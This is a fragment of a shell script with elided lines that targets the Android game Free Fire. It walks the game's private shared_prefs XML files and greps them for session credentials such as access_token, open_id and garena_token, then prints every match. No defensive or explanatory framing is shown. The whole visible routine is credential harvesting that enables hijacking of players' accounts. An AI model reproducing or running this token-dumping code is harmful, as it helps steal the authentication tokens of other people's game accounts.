...
for PKG in com.dts.freefireth com.dts.freefiremax; do
  ...
  if [ -d "$DIR" ]; then
    ...
    find $DIR/shared_prefs -name '*.xml' 2>/dev/null | while read f; do
      if grep -qiE 'access_token|open_id|garena_token|authToken|openId' "$f" 2>/dev/null; then
        echo "[FILE] $f"
        grep -iE 'access_token|open_id|garena_token|authToken|openId' "$f" 2>/dev/null
      fi
    done
    echo "-- Files JSON --"
